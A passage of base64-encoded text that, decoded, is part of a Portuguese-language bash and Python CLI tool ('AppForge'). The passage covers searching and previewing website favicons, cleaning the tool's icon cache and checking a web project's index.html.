aW0ve3NsdWd9Lm9yZz9sYXJnZXI9dHJ1ZScsCiAgICBmJ2h0dHBzOi8vdDMuZ3N0YXRpYy5jb20vZmF2aWNvblYyP2NsaWVudD1TT0NJQUwmdHlwZT1GQVZJQ09OJmZhbGxiYWNrX29wdHM9VFlQRSxTSVpFLFVSTCZ1cmw9aHR0cHM6Ly97c2x1Z30ubmV0JnNpemU9MjU2JywKICAgIGYnaHR0cHM6Ly90My5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnVybD1odHRwczovL3tzbHVnfS5hcHAmc2l6ZT0yNTYnLAogICAgZidodHRwczovL3QzLmdzdGF0aWMuY29tL2Zhdmljb25WMj9jbGllbnQ9U09DSUFMJnR5cGU9RkFWSUNPTiZmYWxsYmFja19vcHRzPVRZUEUsU0laRSxVUkwmdXJsPWh0dHBzOi8ve3NsdWd9LmRldiZzaXplPTI1NicsCiAgICBmJ2h0dHBzOi8vaWNvbi5ob3JzZS9pY29uL3tzbHVnfS5vcmcnLAogICAgZidodHRwczovL2ljb25zLmR1Y2tkdWNrZ28uY29tL2lwMy97c2x1Z30uaW8uaWNvJywKXQoKIyBUYW1hbmhvcyBqYSB2aXN0b3MgKGRlZHVwbGljYWNhbyBlbnRyZSBwYWdpbmFzKQpzdGF0ZV9mPW9zLnBhdGguam9pbih0bXBkaXIsJy5zZWVuX3NpemVzJykKc2Vlbl9zej1zZXQoKQppZiBvcy5wYXRoLmlzZmlsZShzdGF0ZV9mKToKICAgIHdpdGggb3BlbihzdGF0ZV9mKSBhcyBmOgogICAgICAgIGZvciBsbiBpbiBmOgogICAgICAgICAgICB0cnk6IHNlZW5fc3ouYWRkKGludChsbi5zdHJpcCgpKSkKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCgpuZXdfc2l6ZXM9W107IG49MDsgbmV4dF9vZmZzZXQ9bGVuKHNvdXJjZXMpCmZvciBpLHVybCBpbiBlbnVtZXJhdGUoc291cmNlcyk6CiAgICBpZiBpIDwgb2Zmc2V0OiBjb250aW51ZQogICAgIyBQYXJhIHF1YW5kbyB0ZW1vcyBpY29uZXMgc3VmaWNpZW50ZXMg4oCUIGd1YXJkYSBvbmRlIHBhcm91IFNFTSB0ZW50YXIgaQogICAgaWYgbiA+PSBteDoKICAgICAgICBuZXh0X29mZnNldCA9IGkKICAgICAgICBicmVhawogICAgZHN0PW9zLnBhdGguam9pbih0bXBkaXIsZid7b2Zmc2V0K24rMX0ucG5nJykKICAgIGlmIG5vdCBmZXRjaCh1cmwsZHN0KTogY29udGludWUKICAgIHN6PW9zLnBhdGguZ2V0c2l6ZShkc3QpCiAgICBpZiBzeiBpbiBzZWVuX3N6OiBvcy51bmxpbmsoZHN0KTsgY29udGludWUKICAgIHNlZW5fc3ouYWRkKHN6KTsgbmV3X3NpemVzLmFwcGVuZChzeikKICAgIGxhYmVsPXVybC5zcGxpdCgnLycpWzJdLnJlcGxhY2UoJ2ltZy5pY29uczguY29tJywnaWNvbnM4JykucmVwbGFjZSgndDMuZ3N0YXRpYy5jb20nLCdnc3RhdGljJykucmVwbGFjZSgnaWNvbnMuZHVja2R1Y2tnby5jb20nLCdkdWNrZHVja2dvJykKICAgIHByaW50KGYne29mZnNldCtuKzF9OntsYWJlbH06e2RzdH0nKQogICAgbis9MQoKd2l0aCBvcGVuKHN0YXRlX2YsJ2EnKSBhcyBmOgogICAgZm9yIHN6IGluIG5ld19zaXplczogZi53cml0ZShzdHIoc3opKydcbicpCgpwcmludChmJ19fbmV4dF9vZmZzZXRfXzp7bmV4dF9vZmZzZXR9JykKc3lzLmV4aXQoMCBpZiBuPjAgZWxzZSAxKQoiIDI+L2Rldi9udWxsCn0KCgoKCl9pY29uX3Nob3dfdGltZygpIHsKICBsb2NhbCBGSUxFPSIkMSIKICBpZiAhIGNvbW1hbmQgLXYgdGltZyA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICAgIHByaW50ZiAnICBceGUyXHg5NFx4ODIgXDAzM1swOzkwbShpbnN0YWxlIHRpbWc6IHBrZyBpbnN0YWxsIHRpbWcpXDAzM1swbVxuJzsgcmV0dXJuCiAgZmkKICBbICEgLWYgIiRGSUxFIiBdICYmIHJldHVybgogICMgUm9kYSBkaXJldG8gc2VtIGNhcHR1cmEg4oCUIHRpbWcgZGV0ZWN0YSBUVFkgZSB1c2EgbW9kbyBncmFmaWNvIHJlYWwKICB0aW1nIC1VIC1nIDMweDEwIC1iIHdoaXRlICIkRklMRSIgMj4vZGV2L251bGwgfHwgXAogICAgcHJpbnRmICcgIFx4ZTJceDk0XHg4MiBcMDMzWzA7OTBtKHByZXZpZXcgaW5kaXNwb25pdmVsKVwwMzNbMG1cbicKfQoKX2ljb25fc2VhcmNoX2FuZF9zZWxlY3QoKSB7CiAgbG9jYWwgVEVSTT0iJDEiIFJFU1VMVF9GSUxFPSIkMiIKICBsb2NhbCBUTVBESVI7IFRNUERJUj0kKF9pY29uX21rdGVtcF9kaXIpCiAgWyAteiAiJFRNUERJUiIgXSAmJiB7IF93YXJuICdOYW8gZm9pIHBvc3NpdmVsIGNyaWFyIGRpcmV0b3JpbyB0ZW1wb3JhcmlvLic7IHJldHVybiAxOyB9CiAgcHJpbnRmICdcblwwMzNbMTszNW0gIFx4ZTJceDk1XHhhZFx4ZTJceDk0XHg4MFsgQXBwRm9yZ2UgSWNvbiBTZWFyY2ggXVwwMzNbMG1cbicKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MiBcMDMzWzBtXHhmMFx4OWZceDk0XHg4ZVwwMzNbMTszM20gUmVzdWx0YWRvcyBwYXJhOiAlc1wwMzNbMG1cbicgIiRURVJNIgogIHByaW50ZiAnXDAzM1sxOzM1bSAgXHhlMlx4OTRceDgyXDAzM1swbVxuJwogIHByaW50ZiAnXDAzM1sxOzM2bSAgLT4gVmVyaWZpY2FuZG8gY29uZXhhby4uLlwwMzNbMG1cbicKICBpZiAhIF9pY29uX2NoZWNrX25ldDsgdGhlbgogICAgcHJpbnRmICdcblwwMzNbMTszMW0gIFx4ZTJceDljXHg5NyBTZW0gY29uZXhhbyBjb20gYSBJbnRlcm5ldC5cMDMzWzBtXG4nCiAgICBwcmludGYgJyAgICBcMDMzWzA7OTBtVmVyaWZpcXVlIHN1YSBjb25leGFvIGUgdGVudGUgbm92YW1lbnRlLlwwMzNbMG1cblxuJwogICAgcm0gLXJmICIkVE1QRElSIjsgcmV0dXJuIDEKICBmaQogIHByaW50ZiAnXDAzM1sxOzM2bSAgLT4gQnVzY2FuZG8gaWNvbmVzIChHb29nbGUg4oCiIER1Y2tEdWNrR28g4oCiIGZhdmljb24uaW0g4oCiIGljb24uaG9yc2UpLi4uXDAzM1swbVxuJwogIGxvY2FsIFJFU1VMVF9MSU5FUz0oKSBSRVNVTFRfQ09VTlQ9MCBfTkVYVF9PRkZTRVQ9MAogICMgQnVzY2EgUE5HIOKAlCBzZW0gU1ZHCiAgd2hpbGUgSUZTPSByZWFkIC1yIGxpbmU7IGRvCiAgICBpZiBwcmludGYgJyVzJyAiJGxpbmUiIHwgZ3JlcCAtcSAnXl9fbmV4dF9vZmZzZXRfXzonOyB0aGVuCiAgICAgIF9ORVhUX09GRlNFVD0kKHByaW50ZiAnJXMnICIkbGluZSIgfCBjdXQgLWQ6IC1mMikKICAgIGVsaWYgWyAtbiAiJGxpbmUiIF07IHRoZW4KICAgICAgUkVTVUxUX0xJTkVTKz0oIiRsaW5lIik7IFJFU1VMVF9DT1VOVD0kKChSRVNVTFRfQ09VTlQrMSkpCiAgICBmaQogIGRvbmUgPCA8KF9pY29uX3NlYXJjaF9wbmdfc291cmNlcyAiJFRFUk0iICIkVE1QRElSIiA1IDAgMj4vZGV2L251bGwpCiAgaWYgWyAiJFJFU1VMVF9DT1VOVCIgLWVxIDAgXTsgdGhlbgogICAgcHJpbnRmICdcblwwMzNbMTszM20gIFx4ZTJceDljXHg5NyBOZW5odW0gaWNvbmUgZW5jb250cmFkbyBwYXJhOiAlc1wwMzNbMG1cbicgIiRURVJNIgogICAgcHJpbnRmICcgICAgXDAzM1swOzkwbVRlbnRlIG91dHJvIHRlcm1vIChleDogYWYgaWNvbiBzZWFyY2ggY2FtZXJhKVwwMzNbMG1cblxuJwogICAgcm0gLXJmICIkVE1QRElSIjsgcmV0dXJuIDEKICBmaQogIHByaW50ZiAnXDAzM1sxOzMybSAgXHhlMlx4OWNceDkzICVkIGljb25lKHMpIGVuY29udHJhZG8ocylcMDMzWzBtXG4nICIkUkVTVUxUX0NPVU5UIgogIGZvciBlbnRyeSBpbiAiJHtSRVNVTFRfTElORVNbQF19IjsgZG8KICAgIGxvY2FsIG51bTsgbnVtPSQocHJpbnRmICclcycgIiRlbnRyeSIgfCBjdXQgLWQ6IC1mMSkKICAgIGxvY2FsIGZpbGU7IGZpbGU9JChwcmludGYgJyVzJyAiJGVudHJ5IiB8IGN1dCAtZDogLWYzLSkKICAgIHByaW50ZiAnXDAzM1sxOzM1bSAgXHhlMlx4OTRceDgyXDAzM1swbVxuJwogICAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NFx4ODIgXDAzM1sxOzM2bVslc11cMDMzWzBtXG4nICIkbnVtIgogICAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NFx4ODJcMDMzWzBtXG4nCiAgICBfaWNvbl9zaG93X3RpbWcgIiRmaWxlIgogIGRvbmUKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk1XHhiMFx4ZTJceDk0XHg4MFx4ZTJceDllXHhhNFwwMzNbMG0gJwogIGxvY2FsIFNFTEVDVEVEX0ZJTEU9IiIgU0VMRUNURURfTlVNPSIiCiAgd2hpbGUgdHJ1ZTsgZG8KICAgIHByaW50ZiAnUXVhbCBkZXNlamEgdXNhcj8gWzEtJWQgLyBtPW1haXMgLyByPW5vdmEgYnVzY2EgLyBxPWNhbmNlbGFyXTogJyAiJFJFU1VMVF9DT1VOVCIKICAgIElGUz0gcmVhZCAtciBDSE9JQ0UgPC9kZXYvdHR5CiAgICBjYXNlICIkQ0hPSUNFIiBpbgogICAgICBxfFEpIHByaW50ZiAnXG4gIFwwMzNbMDs5MG1DYW5jZWxhZG8uXDAzM1swbVxuXG4nOyBybSAtcmYgIiRUTVBESVIiOyByZXR1cm4gMSA7OwogICAgICByfFIpIHJtIC1yZiAiJFRNUERJUiI7IF9pY29uX3NlYXJjaF9hbmRfc2VsZWN0ICIkVEVSTSIgIiRSRVNVTFRfRklMRSI7IHJldHVybiAkPyA7OwogICAgICBtfE0pCiAgICAgICAgcHJpbnRmICdcblwwMzNbMTszNm0gIC0+IEJ1c2NhbmRvIG1haXMgaWNvbmVzLi4uXDAzM1swbVxuJwogICAgICAgIGxvY2FsIF9ORVdfTElORVM9KCkgX05FV19DT1VOVD0wIF9ORVhUMj0wCiAgICAgICAgd2hpbGUgSUZTPSByZWFkIC1yIGxpbmU7IGRvCiAgICAgICAgICBpZiBwcmludGYgJyVzJyAiJGxpbmUiIHwgZ3JlcCAtcSAnXl9fbmV4dF9vZmZzZXRfXzonOyB0aGVuCiAgICAgICAgICAgIF9ORVhUMj0kKHByaW50ZiAnJXMnICIkbGluZSIgfCBjdXQgLWQ6IC1mMikKICAgICAgICAgIGVsaWYgWyAtbiAiJGxpbmUiIF07IHRoZW4KICAgICAgICAgICAgX05FV19MSU5FUys9KCIkbGluZSIpOyBfTkVXX0NPVU5UPSQoKF9ORVdfQ09VTlQrMSkpCiAgICAgICAgICBmaQogICAgICAgIGRvbmUgPCA8KF9pY29uX3NlYXJjaF9wbmdfc291cmNlcyAiJFRFUk0iICIkVE1QRElSIiA1ICIkX05FWFRfT0ZGU0VUIiAyPi9kZXYvbnVsbCkKICAgICAgICBfTkVYVF9PRkZTRVQ9IiRfTkVYVDIiCiAgICAgICAgaWYgWyAiJF9ORVdfQ09VTlQiIC1lcSAwIF07IHRoZW4KICAgICAgICAgIHByaW50ZiAnXDAzM1sxOzMzbSAgISBTZW0gbWFpcyBpY29uZXMgZGlzcG9uaXZlaXMuXDAzM1swbVxuICAnCiAgICAgICAgZWxzZQogICAgICAgICAgZm9yIF9ubCBpbiAiJHtfTkVXX0xJTkVTW0BdfSI7IGRvCiAgICAgICAgICAgIFJFU1VMVF9MSU5FUys9KCIkX25sIik7IFJFU1VMVF9DT1VOVD0kKChSRVNVTFRfQ09VTlQrMSkpCiAgICAgICAgICAgIGxvY2FsIF9ubjsgX25uPSQocHJpbnRmICclcycgIiRfbmwiIHwgY3V0IC1kOiAtZjEpCiAgICAgICAgICAgIGxvY2FsIF9uZjsgX25mPSQocHJpbnRmICclcycgIiRfbmwiIHwgY3V0IC1kOiAtZjMtKQogICAgICAgICAgICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICAgICAgICAgICAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NFx4ODIgXDAzM1sxOzM2bVslc11cMDMzWzBtXG4nICIkX25uIgogICAgICAgICAgICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk0XHg4MlwwMzNbMG1cbicKICAgICAgICAgICAgX2ljb25fc2hvd190aW1nICIkX25mIgogICAgICAgICAgZG9uZQogICAgICAgICAgcHJpbnRmICdcMDMzWzE7MzVtICBceGUyXHg5NFx4ODJcMDMzWzBtXG4nCiAgICAgICAgICBwcmludGYgJ1wwMzNbMTszNW0gIFx4ZTJceDk1XHhiMFx4ZTJceDk0XHg4MFx4ZTJceDllXHhhNFwwMzNbMG0gJwogICAgICAgIGZpCiAgICAgICAgOzsKICAgICAgJycpICBwcmludGYgJyAgXDAzM1sxOzMxbVx4ZTJceDljXHg5NyBPcGNhbyBpbnZhbGlkYS5cMDMzWzBtXG4gICcgOzsKICAgICAgKikKICAgICAgICBpZiBwcmludGYgJyVzJyAiJENIT0lDRSIgfCBncmVwIC1xRSAnXlswLTldKyQnIFwKICAgICAgICAgICAmJiBbICIkQ0hPSUNFIiAtZ2UgMSBdIDI+L2Rldi9udWxsIFwKICAgICAgICAgICAmJiBbICIkQ0hPSUNFIiAtbGUgIiRSRVNVTFRfQ09VTlQiIF0gMj4vZGV2L251bGw7IHRoZW4KICAgICAgICAgIFNFTEVDVEVEX0ZJTEU9JChwcmludGYgJyVzJyAiJHtSRVNVTFRfTElORVNbJCgoQ0hPSUNFLTEpKV19IiB8IGN1dCAtZDogLWYzLSkKICAgICAgICAgIFNFTEVDVEVEX05VTT0iJENIT0lDRSIKICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZQogICAgICAgICAgcHJpbnRmICcgIFwwMzNbMTszMW1ceGUyXHg5Y1x4OTcgT3BjYW8gaW52YWxpZGEuXDAzM1swbVxuJwogICAgICAgICAgcHJpbnRmICcgIFwwMzNbMDs5MG1ceGUyXHg5Y1x4OTMgRXNjb2xoYSBlbnRyZSAxIGUgJWQuXDAzM1swbVxuICAnICIkUkVTVUxUX0NPVU5UIgogICAgICAgIGZpIDs7CiAgICBlc2FjCiAgZG9uZQogIHByaW50ZiAnXG5cMDMzWzE7MzJtICBceGUyXHg5Y1x4OTMgSWNvbmUgIyVzIHNlbGVjaW9uYWRvXDAzM1swbVxuJyAiJFNFTEVDVEVEX05VTSIKICBwcmludGYgJ1wwMzNbMTszNm0gIC0+IFByb2Nlc3NhbmRvLi4uXDAzM1swbVxuJwogIGxvY2FsIEZJTkFMX1BORz0iJFRNUERJUi9zZWxlY3RlZC5wbmciCiAgaWYgX2ljb25fdG9fcG5nICIkU0VMRUNURURfRklMRSIgIiRGSU5BTF9QTkciIDE5MjsgdGhlbgogICAgcHJpbnRmICdcMDMzWzE7MzJtICBceGUyXHg5Y1x4OTMgSWNvbmUgcHJlcGFyYWRvXDAzM1swbVxuJwogICAgcHJpbnRmICclcycgIiRGSU5BTF9QTkciID4gIiRSRVNVTFRfRklMRSIKICAgIHJldHVybiAwCiAgZWxzZQogICAgX3dhcm4gJ0Vycm8gYW8gcHJvY2Vzc2FyIGljb25lIOKAlCB1c2FuZG8gcGxhY2Vob2xkZXInCiAgICBfZ2VuX2ljb24gIiRGSU5BTF9QTkciIDE5MgogICAgcHJpbnRmICclcycgIiRGSU5BTF9QTkciID4gIiRSRVNVTFRfRklMRSIKICAgIHJldHVybiAwCiAgZmkKfQpfaWNvbl9hdXRvX2Rpc2NvdmVyKCkgewogIGxvY2FsIFVSTD0iJDEiIFRNUERJUj0iJDIiCiAgcHJpbnRmICdcMDMzWzE7MzZtICAtPiBCdXNjYW5kbyBpY29uZSBhdXRvbWF0aWNvIHBhcmE6ICVzXDAzM1swbVxuJyAiJFVSTCIgPiYyCiAgcHl0aG9uMyAtYyAiCmltcG9ydCB1cmxsaWIucmVxdWVzdCwgcmUsIHN5cywgb3MKZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVybHBhcnNlCnVybD0nJFVSTCc7IGRzdD0nJFRNUERJUi9hdXRvLnBuZycKaWYgbm90IHVybC5zdGFydHN3aXRoKCdodHRwJyk6IHVybD0naHR0cHM6Ly8nK3VybApIRFI9eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyKSBBcHBGb3JnZS8xLjMnLCdBY2NlcHQnOicqLyonfQpkZWYgZmV0Y2godSwgb3V0LCB0aW1lb3V0PTEwKToKICAgIHRyeToKICAgICAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1LGhlYWRlcnM9SERSKQogICAgICAgIHdpdGggdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD10aW1lb3V0KSBhcyByOgogICAgICAgICAgICBkYXRhPXIucmVhZCgpCiAgICAgICAgaWYgbGVuKGRhdGEpPDIwMDogcmV0dXJuIEZhbHNlCiAgICAgICAgb3BlbihvdXQsJ3diJykud3JpdGUoZGF0YSk7IHJldHVybiBUcnVlCiAgICBleGNlcHQ6IHJldHVybiBGYWxzZQpwYXJzZWQ9dXJscGFyc2UodXJsKTsgYmFzZT1wYXJzZWQuc2NoZW1lKyc6Ly8nK3BhcnNlZC5uZXRsb2MKZG9tYWluPXBhcnNlZC5uZXRsb2MucmVwbGFjZSgnd3d3LicsJycpCmlmIGZldGNoKCdodHRwczovL3d3dy5nb29nbGUuY29tL3MyL2Zhdmljb25zP2RvbWFpbj0nK2RvbWFpbisnJnN6PTEyOCcsIGRzdCk6CiAgICBpZiBvcy5wYXRoLmdldHNpemUoZHN0KT41MDA6IHByaW50KCdvazonK2RzdCk7IHN5cy5leGl0KDApCmlmIGZldGNoKCdodHRwczovL2Zhdmljb24uaW0vJytkb21haW4rJz9sYXJnZXI9dHJ1ZScsIGRzdCk6CiAgICBpZiBvcy5wYXRoLmdldHNpemUoZHN0KT41MDA6IHByaW50KCdvazonK2RzdCk7IHN5cy5leGl0KDApCmZvciBwYXRoIGluIFsnL2FwcGxlLXRvdWNoLWljb24ucG5nJywnL2FwcGxlLXRvdWNoLWljb24tMTgweDE4MC5wbmcnLCcvZmF2aWNvbi5wbmcnLCcvZmF2aWNvbi5pY28nXToKICAgIGlmIGZldGNoKGJhc2UrcGF0aCwgZHN0KSBhbmQgb3MucGF0aC5nZXRzaXplKGRzdCk+MjAwOiBwcmludCgnb2s6Jytkc3QpOyBzeXMuZXhpdCgwKQp0cnk6CiAgICByZXE9dXJsbGliLnJlcXVlc3QuUmVxdWVzdCh1cmwsaGVhZGVycz1IRFIpCiAgICB3aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9MTApIGFzIHI6CiAgICAgICAgaHRtbD1yLnJlYWQoNjU1MzYpLmRlY29kZSgndXRmLTgnLCdyZXBsYWNlJykKICAgIGZvciBtIGluIHJlLmZpbmRpdGVyKHInPGxpbmtbXj5dK3JlbD1bXCJcXCddKFteXCJcXCc+XSppY29uW15cIlxcJz5dKilbXCJcXCddW14+XSpocmVmPVtcIlxcJ10oW15cIlxcJz5dKylbXCJcXCddJyxodG1sLHJlLkkpOgogICAgICAgIGhyZWY9bS5ncm91cCgyKQogICAgICAgIGlmIGhyZWYuc3RhcnRzd2l0aCgnaHR0cCcpOiBpY29uX3VybD1ocmVmCiAgICAgICAgZWxpZiBocmVmLnN0YXJ0c3dpdGgoJy8vJyk6IGljb25fdXJsPSdodHRwczonK2hyZWYKICAgICAgICBlbGlmIGhyZWYuc3RhcnRzd2l0aCgnLycpOiBpY29uX3VybD1iYXNlK2hyZWYKICAgICAgICBlbHNlOiBpY29uX3VybD1iYXNlKycvJytocmVmCiAgICAgICAgaWYgZmV0Y2goaWNvbl91cmwsIGRzdCkgYW5kIG9zLnBhdGguZ2V0c2l6ZShkc3QpPjIwMDoKICAgICAgICAgICAgcHJpbnQoJ29rOicrZHN0KTsgc3lzLmV4aXQoMCkKZXhjZXB0OiBwYXNzCnByaW50KCdmYWlsJyk7IHN5cy5leGl0KDEpCiIgMj4vZGV2L251bGwKfQpfY21kX2ljb24oKSB7CiAgbG9jYWwgU1VCQ01EPSIkezE6LX0iCiAgc2hpZnQgMj4vZGV2L251bGwgfHwgdHJ1ZQogIGNhc2UgIiRTVUJDTUQiIGluCiAgICBzZWFyY2gpCiAgICAgIGxvY2FsIFRFUk09IiQqIgogICAgICBbIC16ICIkVEVSTSIgXSAmJiB7IHByaW50ZiAnICBVc286IGFmIGljb24gc2VhcmNoIDx0ZXJtbz5cblxuJzsgZXhpdCAxOyB9CiAgICAgIGxvY2FsIFRNUF9SRVNVTFQ7IFRNUF9SRVNVTFQ9JChta3RlbXApCiAgICAgIGlmIF9pY29uX3NlYXJjaF9hbmRfc2VsZWN0ICIkVEVSTSIgIiRUTVBfUkVTVUxUIjsgdGhlbgogICAgICAgIGxvY2FsIElDT05fUEFUSDsgSUNPTl9QQVRIPSQoY2F0ICIkVE1QX1JFU1VMVCIgMj4vZGV2L251bGwpCiAgICAgICAgcm0gLWYgIiRUTVBfUkVTVUxUIgogICAgICAgIGlmIFsgLW4gIiRJQ09OX1BBVEgiIF0gJiYgWyAtZiAiJElDT05fUEFUSCIgXTsgdGhlbgogICAgICAgICAgcHJpbnRmICdcblwwMzNbMTszMm0gIEljb25lIHNhbHZvIGVtOiAlc1wwMzNbMG1cbicgIiRJQ09OX1BBVEgiCiAgICAgICAgICBwcmludGYgJ1wwMzNbMDs5MG0gIFVzZTogYXBwZm9yZ2UgYnVpbGQgLi4uIC0taWNvbiAlc1wwMzNbMG1cblxuJyAiJElDT05fUEFUSCIKICAgICAgICBmaQogICAgICBlbHNlCiAgICAgICAgcm0gLWYgIiRUTVBfUkVTVUxUIgogICAgICBmaSA7OwogICAgY2xlYW4pCiAgICAgIGxvY2FsIEZPUkNFPTAKICAgICAgZm9yIGFyZyBpbiAiJEAiOyBkbyBbICIkYXJnIiA9ICctLWZvcmNlJyBdICYmIEZPUkNFPTE7IGRvbmUKICAgICAgbG9jYWwgQkFTRT0iJF9JQ09OX1RJTUdfQkFTRSIKICAgICAgaWYgWyAhIC1kICIkQkFTRSIgXTsgdGhlbiBfaW5mbyAnTmVuaHVtIGNhY2hlIGRlIGljb25lcyBlbmNvbnRyYWRvLic7IHJldHVybiAwOyBmaQogICAgICBsb2NhbCBDT1VOVDsgQ09VTlQ9JChmaW5kICIkQkFTRSIgLW1pbmRlcHRoIDEgLW1heGRlcHRoIDEgLXR5cGUgZCAyPi9kZXYvbnVsbCB8IHdjIC1sKQogICAgICBpZiBbICIkQ09VTlQiIC1lcSAwIF07IHRoZW4gX2luZm8gJ05lbmh1bSB0ZW1wb3JhcmlvIHBhcmEgcmVtb3Zlci4nOyByZXR1cm4gMDsgZmkKICAgICAgaWYgWyAiJEZPUkNFIiAtZXEgMCBdOyB0aGVuCiAgICAgICAgcHJpbnRmICdcMDMzWzE7MzNtICBSZW1vdmVyICVkIGRpcmV0b3JpbyhzKSBlbSAlcz8gW3MvTl0gXDAzM1swbScgIiRDT1VOVCIgIiRCQVNFIgogICAgICAgIElGUz0gcmVhZCAtciBSRVNQIDwvZGV2L3R0eQogICAgICAgIGNhc2UgIiRSRVNQIiBpbiBzfFN8eXxZKSA6IDs7ICopIHByaW50ZiAnICBDYW5jZWxhZG8uXG4nOyByZXR1cm4gMCA7OyBlc2FjCiAgICAgIGZpCiAgICAgIHJtIC1yZiAiJEJBU0UiOyBfb2sgIkNhY2hlIHJlbW92aWRvICgkQ09VTlQgZGlyZXRvcmlvKHMpKSIgOzsKICAgICopCiAgICAgIHByaW50ZiAnXG5cMDMzWzE7MzVtICBhZiBpY29uIOKAlCBTaXN0ZW1hIGRlIGJ1c2NhIGRlIGljb25lc1wwMzNbMG1cblxuJwogICAgICBwcmludGYgJyAgXDAzM1sxOzMybVVzbzpcMDMzWzBtXG4nCiAgICAgIHByaW50ZiAnICAgIGFmIGljb24gc2VhcmNoIDx0ZXJtbz4gICDigJQgYnVzY2EgaW50ZXJhdGl2YVxuJwogICAgICBwcmludGYgJyAgICBhZiBpY29uIGNsZWFuICAgICAgICAgICAg4oCUIHJlbW92ZSB0ZW1wb3Jhcmlvc1xuJwogICAgICBwcmludGYgJyAgICBhZiBpY29uIGNsZWFuIC0tZm9yY2UgICAg4oCUIHJlbW92ZSBzZW0gY29uZmlybWFjYW9cblxuJyA7OwogIGVzYWMKfQpfY21kX2NoZWNrX3Byb2plY3QoKSB7CiAgbG9jYWwgRElSPSIkMSIKICBsb2NhbCBCPSdcMDMzWzE7MzRtJyBZPSdcMDMzWzE7MzNtJyBSPSdcMDMzWzE7MzFtJyBOPSdcMDMzWzBtJyBEPSdcMDMzWzA7OTBtJwogIFsgLXogIiRESVIiIF0gJiYgeyBfY21kX2hlbHA7IGV4aXQgMTsgfQogIFsgLWQgIiRESVIiIF0gfHwgX2VyciAiRGlyZXTDs3JpbyBuw6NvIGVuY29udHJhZG86ICRESVIiCiAgcHJpbnRmICJcblwwMzNbMTszNW0gID09IGFwcGZvcmdlIGNoZWNrOiAlcyA9PVwwMzNbMG1cblxuIiAiJERJUiIKICBsb2NhbCB0b3RhbCBodG1sX24gY3NzX24ganNfbiBvdGhlcl9uCiAgdG90YWw9JChmaW5kICIkRElSIiAtdHlwZSBmIHwgd2MgLWwpOyBodG1sX249JChmaW5kICIkRElSIiAtdHlwZSBmIC1pbmFtZSAiKi5odG1sIiB8IHdjIC1sKQogIGNzc19uPSQoZmluZCAiJERJUiIgLXR5cGUgZiAtaW5hbWUgIiouY3NzIiB8IHdjIC1sKTsganNfbj0kKGZpbmQgIiRESVIiIC10eXBlIGYgLWluYW1lICIqLmpzIiB8IHdjIC1sKQogIG90aGVyX249JCgodG90YWwgLSBodG1sX24gLSBjc3NfbiAtIGpzX24pKQogIHByaW50ZiAiICAke0R9JWQgYXJxdWl2byhzKTogJWQgSFRNTCAgJWQgQ1NTICAlZCBKUyAgJWQgb3V0cm9zJHtOfVxuXG4iICIkdG90YWwiICIkaHRtbF9uIiAiJGNzc19uIiAiJGpzX24iICIkb3RoZXJfbiIKICBsb2NhbCBmYXRhbHM9MCB3YXJucz0wIG9rcz0wCiAgaWYgWyAhIC1mICIkRElSL2luZGV4Lmh0bWwiIF07IHRoZW4KICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBpbmRleC5odG1sIGF1c2VudGUke059XG4iOyBmYXRhbHM9JCgoZmF0YWxzKzEpKQogIGVsc2UKICAgIHByaW50ZiAiICAke0J9W09LXSAgICBpbmRleC5odG1sIHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSkKICAgIGxvY2FsIGh0bWw7IGh0bWw9JChjYXQgIiRESVIvaW5kZXguaHRtbCIpCiAgICBpZiAhIHByaW50ZiAnJXMnICIkaHRtbCIgfCBncmVwIC1xaSAnPCFkb2N0eXBlIGh0bWw+JzsgdGhlbgogICAgICBwcmludGYgIiAgJHtSfVtGQVRBTF0gU2VtIDwhRE9DVFlQRSBodG1sPiR7Tn1cbiI7IGZhdGFscz0kKChmYXRhbHMrMSkpCiAgICBlbHNlIHByaW50ZiAiICAke0J9W09LXSAgICA8IURPQ1RZUEUgaHRtbD4ke059XG4iOyBva3M9JCgob2tzKzEpKTsgZmkKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICdjaGFyc2V0JzsgdGhlbgogICAgICBwcmludGYgIiAgJHtSfVtGQVRBTF0gU2VtIDxtZXRhIGNoYXJzZXQ+JHtOfVxuIjsgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGVsc2UgcHJpbnRmICIgICR7Qn1bT0tdICAgIGNoYXJzZXQgcHJlc2VudGUke059XG4iOyBva3M9JCgob2tzKzEpKTsgZmkKICAgIGlmICEgcHJpbnRmICclcycgIiRodG1sIiB8IGdyZXAgLXFpICduYW1lPSJ2aWV3cG9ydCInOyB0aGVuCiAgICAgIHByaW50ZiAiICAke1J9W0ZBVEFMXSBTZW0gPG1ldGEgdmlld3BvcnQ+JHtOfVxuIjsgZmF0YWxzPSQoKGZhdGFscysxKSkKICAgIGVsc2UgcHJpbnRmICIgICR7Qn1bT0tdICAgIHZpZXdwb3J0IHByZXNlbnRlJHtOfVxuIjsgb2tzPSQoKG9rcysxKSk7IGZpCiAgZmkKICBwcmludGYgIlxuICAke0R94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA